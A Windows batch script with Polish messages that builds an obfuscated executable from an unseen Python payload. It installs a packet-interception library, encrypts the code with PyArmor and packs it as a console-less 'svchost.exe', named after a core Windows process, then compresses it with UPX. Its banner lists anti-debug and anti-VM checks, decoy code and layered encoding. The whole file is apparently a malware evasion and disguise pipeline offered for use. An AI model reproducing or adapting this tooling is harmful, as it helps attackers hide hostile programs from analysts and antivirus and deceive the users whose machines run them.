@echo off
setlocal enabledelayedexpansion

echo ============================================
echo  BUILD PIPELINE: Obfuscated EXE
echo ============================================
echo.

:: Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [BLAD] Python nie znaleziony! Zainstaluj Python 3.11+
    pause
    exit /b 1
)

:: Install dependencies
echo [1/5] Instalacja zaleznosci...
pip install pyarmor pyinstaller pydivert upx 2>nul
pip install pyarmor pyinstaller pydivert 2>nul

:: Generate obfuscated source
echo [2/5] Generowanie zobfuskowanego kodu...
python generate_obfuscated.py
if errorlevel 1 (
    echo [BLAD] Nie udalo sie wygenerowac zobfuskowanego kodu!
    pause
    exit /b 1
)

:: PyArmor obfuscation
echo [3/5] PyArmor obfuskacja...
pyarmor gen --output armored v2_final.py
if errorlevel 1 (
    echo [WARN] PyArmor nie zadziatal, uzywam surowej wersji...
    mkdir armored 2>nul
    copy v2_final.py armored\v2_final.py
)

:: Copy pyarmor runtime if exists
if exist armored\pyarmor_runtime_000000 (
    echo [*] Kopiowanie PyArmor runtime...
)

:: PyInstaller build
echo [4/5] PyInstaller - budowanie EXE...
cd armored

pyinstaller --onefile ^
    --noconsole ^
    --name svchost ^
    --strip ^
    --exclude-module tkinter ^
    --exclude-module unittest ^
    --exclude-module email ^
    --exclude-module html ^
    --exclude-module http ^
    --exclude-module xml ^
    --exclude-module pydoc ^
    --exclude-module doctest ^
    --exclude-module pdb ^
    --optimize 2 ^
    --clean ^
    v2_final.py

if errorlevel 1 (
    echo [BLAD] PyInstaller nie zadziatal!
    cd ..
    pause
    exit /b 1
)

cd ..

:: UPX compression (if available)
echo [5/5] Kompresja UPX...
where upx >nul 2>&1
if not errorlevel 1 (
    upx --best --lzma armored\dist\svchost.exe 2>nul
    echo [+] UPX kompresja zastosowana
) else (
    echo [*] UPX nie znaleziony, pomijam kompresje
)

:: Copy result
copy armored\dist\svchost.exe .\svchost.exe >nul 2>&1

echo.
echo ============================================
echo  BUILD COMPLETE!
echo ============================================
echo.
if exist svchost.exe (
    echo [+] EXE: %CD%\svchost.exe
    for %%A in (svchost.exe) do echo [+] Rozmiar: %%~zA bajtow
) else (
    echo [+] EXE: armored\dist\svchost.exe
)
echo.
echo Warstwy ochrony:
echo   1. Obfuskacja zmiennych i stringow
echo   2. Marshal + zlib + base85 encoding
echo   3. Anti-debug / Anti-VM checks
echo   4. Decoy code (fake classes/functions)
echo   5. PyArmor bytecode encryption
echo   6. PyInstaller packaging
echo   7. UPX compression
echo.
pause
